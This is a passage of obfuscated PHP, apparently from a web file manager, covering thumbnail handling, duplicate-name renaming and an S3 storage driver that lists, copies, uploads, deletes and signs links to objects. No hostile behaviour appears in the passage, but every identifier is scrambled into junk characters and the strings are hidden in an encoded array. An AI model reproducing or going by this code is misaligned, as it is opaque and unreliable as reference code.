mk_dir(DATA_THUMB); } $¯Ã‚¥Ÿã = DATA_THUMB . $ÒİŠÓŸì; del_file($¯Ã‚¥Ÿã); if (!@file_exists($¯Ã‚¥Ÿã)) { $²÷üüÍ = TEMP_FILES; if (!is_dir($²÷üüÍ)) { mk_dir($²÷üüÍ); } $°•è¬¥í = $²÷üüÍ . $Ñ’ÖÊÕê . $Æ¤íœ¤[10] . $Şº›ş©¯[$Æ¤íœ¤[179]]; if (!@file_exists($°•è¬¥í)) { $°•è¬¥í = $this->download($òıŠçÆ, $°•è¬¥í); } ImageThumb::createThumb($°•è¬¥í, $¯Ã‚¥Ÿã, $À„…¤òš, $À„…¤òš * 10); } if (!file_exists($¯Ã‚¥Ÿã) || filesize($¯Ã‚¥Ÿã) < 100) { return @file_exists($°•è¬¥í) ? IO::fileOut($°•è¬¥í) : $this->fileOut($òıŠçÆ); } if (!($¢úŠú˜Ü = IO::move($¯Ã‚¥Ÿã, $äªº§Êï))) { return IO::fileOut($¯Ã‚¥Ÿã); } del_file($¯Ã‚¥Ÿã); IO::fileOut($¢úŠú˜Ü); } public function fileOutImageServer($ä¥Í¡Î, $ú×úãÈ‘ = 250) { $this->fileOutImage($ä¥Í¡Î, $ú×úãÈ‘); } public function fileNameAuto($å‚„ÇÔÑ, $ì±„îÖŠ, $ÌÅÚëÒı = REPEAT_RENAME, $§Ûˆ¶æ = false) { $ˆª©ÁçÈ =& $_SERVER[ë¦»ºéÌ]; $Ùæ²‡Å¬ = $å‚„ÇÔÑ === $ˆª©ÁçÈ[12] ? $ì±„îÖŠ : rtrim($å‚„ÇÔÑ, $ˆª©ÁçÈ[8]) . $ˆª©ÁçÈ[8] . $ì±„îÖŠ; if ($ÌÅÚëÒı == REPEAT_REPLACE || !$this->exist($Ùæ²‡Å¬) || $§Ûˆ¶æ && $ÌÅÚëÒı != REPEAT_RENAME_FOLDER) { return $ì±„îÖŠ; } if ($ÌÅÚëÒı == REPEAT_SKIP) { return !1; } $Š™¨ÅÉ§ = $ˆª©ÁçÈ[10] . get_path_ext($ì±„îÖŠ); $Š™¨ÅÉ§ = $Š™¨ÅÉ§ == $ˆª©ÁçÈ[10] || $§Ûˆ¶æ ? $ˆª©ÁçÈ[12] : $Š™¨ÅÉ§; $™±­¼¶¿ = 1; $·ŠæÏš´ = substr($ì±„îÖŠ, 0, strlen($ì±„îÖŠ) - strlen($Š™¨ÅÉ§)); $ıÆêï›± = $·ŠæÏš´ . "\x28{$™±­¼¶¿}\x29{$Š™¨ÅÉ§}"; while ($this->exist(rtrim($å‚„ÇÔÑ, $ˆª©ÁçÈ[8]) . $ˆª©ÁçÈ[8] . $ıÆêï›±)) { $ıÆêï›± = $·ŠæÏš´ . "\50{$™±­¼¶¿}\51{$Š™¨ÅÉ§}"; $™±­¼¶¿++; } return $ıÆêï›±; } private function fileNameAutoList($ËÕ›ıÕŒ, $ìÍëñÈ¿, $¼âä¨ÇØ = false) { $ßµ§æâ =& $_SERVER[ë¦»ºéÌ]; $Ìª¸¡ãÍ = $this->listPath($ËÕ›ıÕŒ, !0); $Ìª¸¡ãÍ = array_merge($Ìª¸¡ãÍ[$ßµ§æâ[87]], $Ìª¸¡ãÍ[$ßµ§æâ[86]]); $Ìµô¬êú = array_to_keyvalue($Ìª¸¡ãÍ, $ßµ§æâ[12], $ßµ§æâ[42]); $ ú‘š½‘ = $ßµ§æâ[10] . get_path_ext($ìÍëñÈ¿); $ ú‘š½‘ = $ ú‘š½‘ == $ßµ§æâ[10] || $¼âä¨ÇØ ? $ßµ§æâ[12] : $ ú‘š½‘; $ÅûÓÖñ = substr($ìÍëñÈ¿, 0, strlen($ìÍëñÈ¿) - strlen($ ú‘š½‘)); $‘µıŞñı = $ÅûÓÖñ . "\50\60\51{$ ú‘š½‘}"; for ($’”Ğ·—¯ = 1; $’”Ğ·—¯ <= count($Ìµô¬êú) + 1; $’”Ğ·—¯++) { $‘µıŞñı = $ÅûÓÖñ . "\50{$’”Ğ·—¯}\51{$ ú‘š½‘}"; if (!in_array_not_case($‘µıŞñı, $Ìµô¬êú)) { return $‘µıŞñı; } } return $‘µıŞñı; } public function listAllFiles($Ê¨İÎİ, $„’“Ìœ”, $ı”õë© = array()) { $ÇÀİŠÕË =& $_SERVER[ë¦»ºéÌ]; if (empty($„’“Ìœ”)) { return array(); } $‡Ï¯Ÿç¨ = array(); $Ê¨İÎİ = trim($Ê¨İÎİ, $ÇÀİŠÕË[8]); foreach ($„’“Ìœ” as $¹òø¬Ñ”) { $êÇ÷—õ = ltrim(substr(trim($¹òø¬Ñ”, $ÇÀİŠÕË[8]), strlen($Ê¨İÎİ)), $ÇÀİŠÕË[8]); $‡Ï¯Ÿç¨ = array_merge($‡Ï¯Ÿç¨, $this->slicePath($êÇ÷—õ)); } $‚µ¡àª’ = array(); foreach (array_unique($‡Ï¯Ÿç¨) as $¹òø¬Ñ”) { $œµ£°ˆÜ = array($ÇÀİŠÕË[88] => $this->getPathOuter($ÇÀİŠÕË[8] . $Ê¨İÎİ . $ÇÀİŠÕË[8] . $¹òø¬Ñ”), $ÇÀİŠÕË[89] => 1, $ÇÀİŠÕË[90] => 0); if (substr($¹òø¬Ñ”, -1) != $ÇÀİŠÕË[8]) { $œµ£°ˆÜ[$ÇÀİŠÕË[89]] = 0; $¦¦ª½àå = $this->getPath($Ê¨İÎİ . $ÇÀİŠÕË[8] . $¹òø¬Ñ”); $œµ£°ˆÜ[$ÇÀİŠÕË[90]] = isset($ı”õë©[$¦¦ª½àå]) ? $ı”õë©[$¦¦ª½àå] : $this->size($¦¦ª½àå); } $‚µ¡àª’[] = $œµ£°ˆÜ; } return $‚µ¡àª’; } public function slicePath($¥Óâ´Óƒ) { $€©Æ÷şõ =& $_SERVER[ë¦»ºéÌ]; $ˆòª‡ç± = explode($€©Æ÷şõ[8], trim($¥Óâ´Óƒ, $€©Æ÷şõ[8])); $¦¡¥’ƒ¿ = 0; do { ++$¦¡¥’ƒ¿; $Úİ´ÌĞø[] = implode($€©Æ÷şõ[8], array_slice($ˆòª‡ç±, 0, $¦¡¥’ƒ¿)) . $€©Æ÷şõ[8]; } while ($¦¡¥’ƒ¿ < count($ˆòª‡ç±)); $Úİ´ÌĞø[count($ˆòª‡ç±) - 1] = $¥Óâ´Óƒ; return $Úİ´ÌĞø; } public function getHost() { $ÌšÓÚê =& $_SERVER[ë¦»ºéÌ]; $—İ¿§ÃÎ = parse_url(trim($this->domain, $ÌšÓÚê[8])); $ôã§ÌĞö = isset($—İ¿§ÃÎ[$ÌšÓÚê[185]]) ? $—İ¿§ÃÎ[$ÌšÓÚê[185]] : http_type(); $‚€øÛòó = isset($—İ¿§ÃÎ[$ÌšÓÚê[186]]) ? $—İ¿§ÃÎ[$ÌšÓÚê[186]] : $—İ¿§ÃÎ[$ÌšÓÚê[88]]; if (isset($—İ¿§ÃÎ[$ÌšÓÚê[187]])) { $‚€øÛòó .= $ÌšÓÚê[4] . $—İ¿§ÃÎ[$ÌšÓÚê[187]]; } return $ôã§ÌĞö . $ÌšÓÚê[188] . $‚€øÛòó; } public function pathEncode($àÕ­­ğÄ) { $œ²šğí’ =& $_SERVER[ë¦»ºéÌ]; return str_replace($œ²šğí’[189], $œ²šğí’[8], rawurlencode($àÕ­­ğÄ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($›‚°‘««) { set_timeout(); require_once SDK_DIR . $_SERVER[ë¦»ºéÌ][190]; parent::__construct(); $this->_init($›‚°‘««); } public function _init($ŒİæŒî…) { foreach ($ŒİæŒî… as $Ïûö¯³é => $×£êºæ”) { if (isset($this->{$Ïûö¯³é})) { $this->{$Ïûö¯³é} = $×£êºæ”; } } $this->endpoint = $ŒİæŒî…[$_SERVER[ë¦»ºéÌ][191]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Ó×¸­ = "\166\64") { $this->signVer = $Ó×¸­; $this->client->setSignatureVersion($Ó×¸­); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $åŸ‡–ÌÜ =& $_SERVER[ë¦»ºéÌ]; $Õ÷Ÿãï® = $this->getBucketCors(); if (!$Õ÷Ÿãï® || !is_array($Õ÷Ÿãï®)) { return !1; } if ($Õ÷Ÿãï®[$åŸ‡–ÌÜ[192]] != $åŸ‡–ÌÜ[193] || $Õ÷Ÿãï®[$åŸ‡–ÌÜ[194]] != $åŸ‡–ÌÜ[193]) { return !1; } $ñŸœœóŠ = array_map($åŸ‡–ÌÜ[195], $Õ÷Ÿãï®[$åŸ‡–ÌÜ[196]]); if (!is_array($ñŸœœóŠ)) { $ñŸœœóŠ = array(); } $ö¨ŸØ€Ä = array($åŸ‡–ÌÜ[197], $åŸ‡–ÌÜ[198], $åŸ‡–ÌÜ[199], $åŸ‡–ÌÜ[200], $åŸ‡–ÌÜ[201]); $ã™µË€™ = array_diff($ö¨ŸØ€Ä, $ñŸœœóŠ); return empty($ã™µË€™); } public function mkfile($Ï€¨àú, $ùÀü¡ ë = '', $æı·ÒÄ£ = REPEAT_RENAME) { $ìÊğ•» = $this->setContent($Ï€¨àú, $ùÀü¡ ë); if ($ìÊğ•» !== !1) { return $this->getPathOuter($Ï€¨àú); } return !1; } public function mkdir($ ³‰Ş»½, $©Ã«ëÌ = REPEAT_SKIP) { $’ëƒâÇ =& $_SERVER[ë¦»ºéÌ]; if (empty($ ³‰Ş»½) && $ ³‰Ş»½ !== $’ëƒâÇ[202]) { return !1; } if ($this->_isFolder($ ³‰Ş»½)) { return $this->getPathOuter($ ³‰Ş»½); } $à•ÖµºŠ = $this->setContent($ ³‰Ş»½, $’ëƒâÇ[12], !0); if ($à•ÖµºŠ !== !1) { return $this->getPathOuter($ ³‰Ş»½); } return !1; } public function copyFile($¶Ş©“ßÜ, $Ö ìÑæ…, $ùë÷£Í = array()) { $£‚âğúñ =& $_SERVER[ë¦»ºéÌ]; $¯ò«Îæ† = $this->objectMeta($¶Ş©“ßÜ); if (!$¯ò«Îæ†) { return !1; } if ($¯ò«Îæ†[$£‚âğúñ[90]] <= 1024 * 1024 * 200) { $Œü¢»ƒë = $this->client->copyObject($this->bucket, $¶Ş©“ßÜ, $this->bucket, $Ö ìÑæ…, $£‚âğúñ[203], $ùë÷£Í); } else { $Œü¢»ƒë = $this->client->multiCopyObject($this->bucket, $¶Ş©“ßÜ, $this->bucket, $Ö ìÑæ…, $ùë÷£Í); } $Œü¢»ƒë = $Œü¢»ƒë ? $this->getPathOuter($Ö ìÑæ…) : !1; return $Œü¢»ƒë; } public function moveFile($·”©ÃŠ , $Š¼³üÂ) { if ($this->copyFile($·”©ÃŠ , $Š¼³üÂ)) { $this->delFile($·”©ÃŠ ); return $this->getPathOuter($Š¼³üÂ); } return !1; } public function delFile($äŞ½’Ò) { return $this->client->deleteObject($this->bucket, $äŞ½’Ò); } public function delFolder($×Ã¥¡¹) { $×ğ‡ÚÅ® =& $_SERVER[ë¦»ºéÌ]; if (!$this->exist($×Ã¥¡¹)) { return !0; } $this->listItemCache = !1; $ù¿œ–ıº = $this->fileList($×Ã¥¡¹); $this->listItemCache = !0; $ò×´»ıÙ = trim($×Ã¥¡¹, $×ğ‡ÚÅ®[8]) . $×ğ‡ÚÅ®[8]; if (!empty($×Ã¥¡¹) && $×Ã¥¡¹ !== $×ğ‡ÚÅ®[202] && !in_array($ò×´»ıÙ, $ù¿œ–ıº[$×ğ‡ÚÅ®[87]])) { $ù¿œ–ıº[$×ğ‡ÚÅ®[87]][] = $ò×´»ıÙ; } $¶Á¼™şó = $this->delByBatch($ù¿œ–ıº[$×ğ‡ÚÅ®[86]]); if (!$¶Á¼™şó) { return !1; } $¶Á¼™şó = $this->delByBatch($ù¿œ–ıº[$×ğ‡ÚÅ®[87]]); if (!$¶Á¼™şó) { return !1; } return $this->delFile($ò×´»ıÙ); } private function delByBatch($Ú±•±Á¿) { foreach (array_chunk($Ú±•±Á¿, 1000) as $é¶öù¢¬) { $”¸Ù¨Ù = $this->client->deleteObjects($this->bucket, $é¶öù¢¬); if (!$”¸Ù¨Ù) { return !1; } } return !0; } public function rename($Š¨ôÁñ, $ÌŸ¢¬àú) { return $this->renameObject($Š¨ôÁñ, $ÌŸ¢¬àú); } public function listPath($ı†ôÚğİ, $ßÂãëÅí = false) { $”çíÔ§ò =& $_SERVER[ë¦»ºéÌ]; $ÌİìŞ§ = $this->fileList($ı†ôÚğİ, $”çíÔ§ò[8], !0); foreach ($ÌİìŞ§[$”çíÔ§ò[87]] as $ÃùáıÎŞ => $˜³’Àúƒ) { $ÌİìŞ§[$”çíÔ§ò[87]][$ÃùáıÎŞ] = $this->folderInfo($˜³’Àúƒ, $ßÂãëÅí); } foreach ($ÌİìŞ§[$”çíÔ§ò[86]] as $ÃùáıÎŞ => $˜³’Àúƒ) { $ÌİìŞ§[$”çíÔ§ò[86]][$ÃùáıÎŞ] = $this->fileInfo($˜³’Àúƒ[$”çíÔ§ò[42]], $ßÂãëÅí, $˜³’Àúƒ); } return $ÌİìŞ§; } private function fileInfo($Ë¡Äáˆ¥, $Ê™ø©¹Ö = false, $¦“ÕÚøÒ = array()) { $áÒ‡…©  =& $_SERVER[ë¦»ºéÌ]; $Õ°—” = array($áÒ‡…© [42] => $this->pathThis($Ë¡Äáˆ¥), $áÒ‡…© [88] => $this->getPathOuter($Ë¡Äáˆ¥), $áÒ‡…© [43] => $áÒ‡…© [204], $áÒ‡…© [179] => $this->ext($Ë¡Äáˆ¥), $áÒ‡…© [90] => isset($¦“ÕÚøÒ[$áÒ‡…© [90]]) ? $¦“ÕÚøÒ[$áÒ‡…© [90]] : 0); if ($Ê™ø©¹Ö) { return $Õ°—”; } $Õ°—”[$áÒ‡…© [205]] = $Õ°—”[$áÒ‡…© [96]] = 0; $Õ°—”[$áÒ‡…© [206]] = $Õ°—”[$áÒ‡…© [207]] = !0; if (empty($¦“ÕÚøÒ)) { $¦“ÕÚøÒ = $this->objectMeta($Ë¡Äáˆ¥); if (!$¦“ÕÚøÒ) { return $Õ°—”; } } if (isset($¦“ÕÚøÒ[$áÒ‡…© [208]])) { $Õ°—”[$áÒ‡…© [96]] = $¦“ÕÚøÒ[$áÒ‡…© [208]]; } if (isset($¦“ÕÚøÒ[$áÒ‡…© [90]])) { $Õ°—”[$áÒ‡…© [90]] = $¦“ÕÚøÒ[$áÒ‡…© [90]]; } return $Õ°—”; } private function folderInfo($”ÌìòÄ, $§½ñ¯ŠÉ = false) { $Øê±¼ºÀ =& $_SERVER[ë¦»ºéÌ]; $´‹»ˆÜ˜ = array($Øê±¼ºÀ[42] => $this->pathThis($”ÌìòÄ), $Øê±¼ºÀ[88] => $this->getPathOuter($Øê±¼ºÀ[8] . $”ÌìòÄ), $Øê±¼ºÀ[43] => $Øê±¼ºÀ[89]); if ($§½ñ¯ŠÉ) { return $´‹»ˆÜ˜; } $´‹»ˆÜ˜[$Øê±¼ºÀ[205]] = $´‹»ˆÜ˜[$Øê±¼ºÀ[96]] = 0; $´‹»ˆÜ˜[$Øê±¼ºÀ[206]] = $´‹»ˆÜ˜[$Øê±¼ºÀ[207]] = !0; if ($”ÌìòÄ == $Øê±¼ºÀ[12]) { return $´‹»ˆÜ˜; } $”ÌìòÄ = trim($”ÌìòÄ, $Øê±¼ºÀ[8]) . $Øê±¼ºÀ[8]; $…¡Šù = $this->objectMeta($”ÌìòÄ); if (isset($…¡Šù[$Øê±¼ºÀ[208]])) { $´‹»ˆÜ˜[$Øê±¼ºÀ[205]] = $…¡Šù[$Øê±¼ºÀ[208]]; } return $´‹»ˆÜ˜; } private function fileList($ÕËÏò×, $‘Éü‡ò = '', $·Ô½–é = 0) { $È™çÏÜ¯ =& $_SERVER[ë¦»ºéÌ]; $ÈÔ¹¹¶û = rtrim($ÕËÏò×, $È™çÏÜ¯[8]) . $È™çÏÜ¯[8]; $œâ¿¡ = $this->listObjs($ÈÔ¹¹¶û, null, null, $‘Éü‡ò); if (!$œâ¿¡) { return array($È™çÏÜ¯[87] => array(), $È™çÏÜ¯[86] => array()); } $éÂá¼ãÂ = $this->listItemCache === !1 ? !1 : !0; $§ÒüĞöğ = $…ıõ¢ù = array(); foreach ($œâ¿¡[$È™çÏÜ¯[209]] as $¯—òºÌş) { $–ªƒ µ‚ = $¯—òºÌş[$È™çÏÜ¯[42]]; if ($–ªƒ µ‚ == $ÈÔ¹¹¶û) { continue; } $ª““ŒÙ = isset($¯—òºÌş[$È™çÏÜ¯[90]]) ? $¯—òºÌş[$È™çÏÜ¯[90]] : 0; $òÄ¢Ãï = $ª““ŒÙ == 0 && substr($–ªƒ µ‚, strlen($–ªƒ µ‚) - 1, 1) == $È™çÏÜ¯[8] ? !0 : !1; if ($éÂá¼ãÂ) { $this->cacheMethod($È™çÏÜ¯[210], $–ªƒ µ‚, $òÄ¢Ãï); $this->cacheMethod($È™çÏÜ¯[211], $–ªƒ µ‚, $¯—òºÌş); } if ($òÄ¢Ãï) { $§ÒüĞöğ[] = $–ªƒ µ‚; continue; } $…ıõ¢ù[] = $·Ô½–é ? $¯—òºÌş : $–ªƒ µ‚; } foreach ($œâ¿¡[$È™çÏÜ¯[212]] as $¯—òºÌş) { $§ÒüĞöğ[] = $¯—òºÌş[$È™çÏÜ¯[42]]; if ($éÂá¼ãÂ) { $this->cacheMethod($È™çÏÜ¯[210], $¯—òºÌş[$È™çÏÜ¯[42]], !0); } } if ($éÂá¼ãÂ) { $this->cacheMethod($È™çÏÜ¯[210], $ÕËÏò×, !0); } return array($È™çÏÜ¯[87] => $§ÒüĞöğ, $È™çÏÜ¯[86] => $…ıõ¢ù); } private function listObjs($Á‡›‰’¨, $ÏÓŸĞ—æ = null, $©ß©„ãĞ = null, $Šáº£ùŒ = null) { $†¯­†»È =& $_SERVER[ë¦»ºéÌ]; $Á‡›‰’¨ = trim($Á‡›‰’¨, $†¯­†»È[8]); $Š‚×€ßò = empty($Á‡›‰’¨) && $Á‡›‰’¨ !== $†¯­†»È[202] ? $†¯­†»È[12] : $Á‡›‰’¨ . $†¯­†»È[8]; return $this->client->getBucket($this->bucket, $Š‚×€ßò, $ÏÓŸĞ—æ, $©ß©„ãĞ, $Šáº£ùŒ, !0); } public function has($à†”¶¸, $‘óçğ®È = false, $òé¢£Óú = true) { $ÜÆÜÌÄë =& $_SERVER[ë¦»ºéÌ]; $à†”¶¸ = trim($à†”¶¸, $ÜÆÜÌÄë[8]); $¥ëÆç¶ = empty($à†”¶¸) && $à†”¶¸ !== $ÜÆÜÌÄë[202] ? $ÜÆÜÌÄë[12] : $à†”¶¸ . $ÜÆÜÌÄë[8]; $ç²¿¿‰ = null; $«ÁÑ­ê¾ = 500; $ÜÑˆÇÙ = $ÜÆÜÌÄë[8]; $ØœæÍË = $ù’îçÃµ = array(); while (!0) { $£…öŒ¹ = $this->listObjs($à†”¶¸, $ç²¿¿‰, $«ÁÑ­ê¾, $ÜÑˆÇÙ); if (!$£…öŒ¹) { break; } $ç²¿¿‰ = $£…öŒ¹[$ÜÆÜÌÄë[213]]; $ŒÃÇØçõ = $£…öŒ¹[$ÜÆÜÌÄë[209]]; $Êé§Ñ÷è = $£…öŒ¹[$ÜÆÜÌÄë[212]]; if (empty($ŒÃÇØçõ) && empty($Êé§Ñ÷è)) { break; } if (count($ŒÃÇØçõ) == 1 && $ŒÃÇØçõ[0][$ÜÆÜÌÄë[42]] == $¥ëÆç¶) { break; } if ($‘óçğ®È) { if (count($ŒÃÇØçõ)) { $ŒÃÇØçõ = array_column($ŒÃÇØçõ, $ÜÆÜÌÄë[42]); $ØœæÍË = array_merge($ØœæÍË, $ŒÃÇØçõ); } if (count($Êé§Ñ÷è)) { $Êé§Ñ÷è = array_column($Êé§Ñ÷è, $ÜÆÜÌÄë[42]); $ù’îçÃµ = array_merge($ù’îçÃµ, $Êé§Ñ÷è); } if ($ç²¿¿‰ === null) { break; } continue; } if ($òé¢£Óú) { if (!empty($ŒÃÇØçõ)) { if (count($ŒÃÇØçõ) > 1 || isset($ŒÃÇØçõ[0][$ÜÆÜÌÄë[42]]) && $ŒÃÇØçõ[0][$ÜÆÜÌÄë[42]] != $¥ëÆç¶) { return !0; } } } else { if (!empty($Êé§Ñ÷è)) { return !0; } } if ($ç²¿¿‰ === null) { break; } } if ($‘óçğ®È) { $ØœæÍË = array_diff($ØœæÍË, array($¥ëÆç¶)); $ØœæÍË = count(array_unique($ØœæÍË)); $ù’îçÃµ = count(array_unique($ù’îçÃµ)); return array($ÜÆÜÌÄë[214] => $ØœæÍË, $ÜÆÜÌÄë[215] => $ù’îçÃµ); } return !1; } public function listAll($õöšÄâ‡) { $«øÄ°šş =& $_SERVER[ë¦»ºéÌ]; $Ş¼ƒã©Û = $this->fileList($õöšÄâ‡, $«øÄ°šş[12], !0); $Îïâ¤Şë = array(); foreach ($Ş¼ƒã©Û[$«øÄ°šş[86]] as $ğä¥˜Ö´) { $Îïâ¤Şë[$ğä¥˜Ö´[$«øÄ°šş[42]]] = $ğä¥˜Ö´[$«øÄ°šş[90]]; } foreach ($Ş¼ƒã©Û[$«øÄ°šş[87]] as $ğä¥˜Ö´) { if (is_string($ğä¥˜Ö´)) { $Îïâ¤Şë[$ğä¥˜Ö´] = 0; } } return $this->listAllFiles($õöšÄâ‡, array_keys($Îïâ¤Şë), $Îïâ¤Şë); } public function canRead($êğ°¾ÕÆ) { $î¯ı¾»ı =& $_SERVER[ë¦»ºéÌ]; $à¥¦í‡Á = $this->client->getAccessControlPolicy($this->bucket, $êğ°¾ÕÆ); if (!$à¥¦í‡Á) { return !1; } return in_array($à¥¦í‡Á, array($î¯ı¾»ı[216], $î¯ı¾»ı[217], $î¯ı¾»ı[218])) ? !0 : !1; } public function canWrite($À±Ü÷ç) { $¼ö§¯³ =& $_SERVER[ë¦»ºéÌ]; $ûí¢ ³ = $this->client->getAccessControlPolicy($this->bucket, $À±Ü÷ç); if (!$ûí¢ ³) { return !1; } return in_array($ûí¢ ³, array($¼ö§¯³[216], $¼ö§¯³[217])) ? !0 : !1; } public function getContent($Ã‰‹Ó‘æ) { return $this->client->getObject($this->bucket, $Ã‰‹Ó‘æ); } public function setContent($‰¯™¼â, $æÕ½Åö˜ = '', $¾Ï¸ª‡ = false) { $ı ĞÇÜ¸ =& $_SERVER[ë¦»ºéÌ]; $‰¯™¼â = $¾Ï¸ª‡ ? trim($‰¯™¼â, $ı ĞÇÜ¸[8]) . $ı ĞÇÜ¸[8] : $‰¯™¼â; $÷…£ÁÄ­ = get_file_mime(get_path_ext($‰¯™¼â)); $¿œ¨†–¦ = $this->client->putObject($æÕ½Åö˜, $this->bucket, $‰¯™¼â, $ı ĞÇÜ¸[203], array(), $÷…£ÁÄ­); if (!$¿œ¨†–¦) { return !1; } if ($¾Ï¸ª‡) { return !0; } $this->cacheMethod(null, null); $¿œ¨†–¦ = $this->copyFile($‰¯™¼â, $‰¯™¼â, array($ı ĞÇÜ¸[219] => $¿œ¨†–¦[$ı ĞÇÜ¸[220]])); return $¿œ¨†–¦ ? !0 : !1; } public function fileSubstr($˜¿¸ÒŞĞ, $ÅÃÈ’‹Ã, $—²¹ ‘Æ) { $ô¥º³’ğ = $ÅÃÈ’‹Ã + $—²¹ ‘Æ - 1; return $this->client->getObject($this->bucket, $˜¿¸ÒŞĞ, array($_SERVER[ë¦»ºéÌ][221] => "\x62\171\164\x65\x73\75{$ÅÃÈ’‹Ã}\x2d{$ô¥º³’ğ}")); } public function upload($èá‚é¾Ì, $‚Ğ­§’è, $Ù€¼÷óÈ = false, $íäšı  = REPEAT_REPLACE) { $Ñé·ØæÍ =& $_SERVER[ë¦»ºéÌ]; $ŒÌº¶ô = array($Ñé·ØæÍ[219] => @md5_file($‚Ğ­§’è)); $‡³üİñ£ = array($Ñé·ØæÍ[222] => get_file_mime(get_path_ext($èá‚é¾Ì))); if (IO::size($‚Ğ­§’è) <= 1024 * 1024 * 200) { $Á†ò½çº = $this->client->putObjectFile($‚Ğ­§’è, $this->bucket, $èá‚é¾Ì, $Ñé·ØæÍ[203], $ŒÌº¶ô, $‡³üİñ£); return !empty($Á†ò½çº) ? $this->getPathOuter($èá‚é¾Ì) : !1; } $¿ü‰åÊ¨ = $this->client->multiUploadObject($‚Ğ­§’è, $this->bucket, trim($èá‚é¾Ì, $Ñé·ØæÍ[8]), $ŒÌº¶ô, $‡³üİñ£); return $¿ü‰åÊ¨ ? $this->getPathOuter($èá‚é¾Ì) : !1; } public function download($•ñÄ¥­, $ËÂÖ‹Ö¬) { if (!@is_dir($this->pathFather($ËÂÖ‹Ö¬)) && !IO::mkdir($this->pathFather($ËÂÖ‹Ö¬))) { return !1; } $ÑÕÉµşÑ = $this->client->getObject($this->bucket, $•ñÄ¥­, array(), $ËÂÖ‹Ö¬); return $ÑÕÉµşÑ !== !1 ? $ËÂÖ‹Ö¬ : !1; } public function link($¯¨Çşš‡, $¨¶¢Üü’ = array()) { $ÌãµÏÕ« =& $_SERVER[ë¦»ºéÌ]; if ($this->signVer == $ÌãµÏÕ«[223]) { return $this->client->getAuthenticatedURL($this->bucket, $¯¨Çşš‡, 3600 * 12, $¨¶¢Üü’); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($¯¨Çşš‡, $ÌãµÏÕ«[8]), 3600 * 12, $this->region, array(), !0, $¨¶¢Üü’); } public function fileOut($½²éÌ®£, $¶”ÅœÁß = false, $¨¯ñ°ŠÜ = false, $´ Ñİ¹Ã = '') { $æ€›»ñà =& $_SERVER[ë¦»ºéÌ]; if ($this->isFileOutServer()) { return $this->fileOutServer($½²éÌ®£, $¶”ÅœÁß, $¨¯ñ°ŠÜ, $´ Ñİ¹Ã); } if (!$¨¯ñ°ŠÜ) { $¨¯ñ°ŠÜ = $this->pathThis($½²éÌ®£); } $½°€³Ğ™ = get_file_mime(get_path_ext($¨¯ñ°ŠÜ)); if ($½°€³Ğ™ == $æ€›»ñà[224]) { return parent::fileOut($½²éÌ®£, $¶”ÅœÁß, $¨¯ñ°ŠÜ, $´ Ñİ¹Ã); } $ß²ÁÏ‰° = array($æ€›»ñà[225] => $½°€³Ğ™); if ($¶”ÅœÁß) { $ß²ÁÏ‰°[$æ€›»ñà[226]] = $æ€›»ñà[227] . rawurlencode($¨¯ñ°ŠÜ); } else { } $‹òğ„ºŒ = $this->link($½²éÌ®£, $ß²ÁÏ‰°); $this->fileOutLink($‹òğ„ºŒ); } public function fileOutServer($ÀÏ§Õ¦À, $Ö—¿‹Ï = false, $”ó‡Ë‚œ = false, $î¤¥£å¢ = '') { parent::fileOut($ÀÏ§Õ¦À, $Ö—¿‹Ï, $”ó‡Ë‚œ, $î¤¥£å¢); } public function fileOutImageServer($ÃÏÃÎÚĞ, $çú‘‚Ò = 250) { parent::fileOutImage($ÃÏÃÎÚĞ, $çú‘‚Ò); } public function hashMd5($ï¼’£, $Ï×‚òæ¶ = '') { $Éˆ×ËÄâ =& $_SERVER[ë¦»ºéÌ]; $ò÷¿ö Ø = $this->objectMeta($ï¼’£); if (!$ò÷¿ö Ø) { return !1; } $Ï×‚òæ¶ = $Ï×‚òæ¶ ? $Ï×‚òæ¶ : _get($ò÷¿ö Ø, $Éˆ×ËÄâ[228]); $Ï×‚òæ¶ = $Ï×‚òæ¶ ? $Ï×‚òæ¶ : _get($ò÷¿ö Ø, $Éˆ×ËÄâ[220], $Éˆ×ËÄâ[12]); return $Ï×‚òæ¶; } public function uploadFormData($±ğĞÂ½°, $©Ş‰Ãí¥ = 3600) { $Š¶Ô¢œÖ =& $_SERVER[ë¦»ºéÌ]; $ö‚œöÔ = $this->pathFather($±ğĞÂ½°); $¼êµ‰ø¨ = $this->client->getHttpUploadPostParams($this->bucket, $ö‚œöÔ, $Š¶Ô¢œÖ[203], $©Ş‰Ãí¥); return array_merge((array) $¼êµ‰ø¨, array($Š¶Ô¢œÖ[186] => $this->getHost())); } public function multiUploadFormData($ï¸¬„ùß, $ƒë Å°€ = 3600) { $¼Êø÷´‡ =& $_SERVER[ë¦»ºéÌ]; $ÍŞœ¿¨… = gmdate($¼Êø÷´‡[229]); $ºõª³š´ = array(); $úÆùõÍ = $this->client->getUploadId($this->bucket, $ï¸¬„ùß, $ºõª³š´); if (!$úÆùõÍ) { return !1; } return array($¼Êø÷´‡[230] => $úÆùõÍ, $¼Êø÷´‡[186] => $this->getHost() . $¼Êø÷´‡[8] . $this->pathEncode($ï¸¬„ùß), $¼Êø÷´‡[231] => $ÍŞœ¿¨…, $¼Êø÷´‡[105] => $ï¸¬„ùß); } public function multiUploadAuthData($‚ç”ßëà, $ºâ«ã£¿ = array()) { $ÃâÅ¹¤³ =& $_SERVER[ë¦»ºéÌ]; $´Øıı¤ = isset($ºâ«ã£¿[$ÃâÅ¹¤³[231]]) ? $ºâ«ã£¿[$ÃâÅ¹¤³[231]] : gmdate($ÃâÅ¹¤³[229]); $ô—¸õš = isset($ºâ«ã£¿[$ÃâÅ¹¤³[179]]) ? $ºâ«ã£¿[$ÃâÅ¹¤³[179]] : $ÃâÅ¹¤³[12]; $Ñ¼²Ğ£Ø = $ºâ«ã£¿[$ÃâÅ¹¤³[105]]; unset($ºâ«ã£¿[$ÃâÅ¹¤³[105]]); if (isset($ºâ«ã£¿[$ÃâÅ¹¤³[232]])) { $ºâ«ã£¿[$ÃâÅ¹¤³[231]] = $´Øıı¤; return 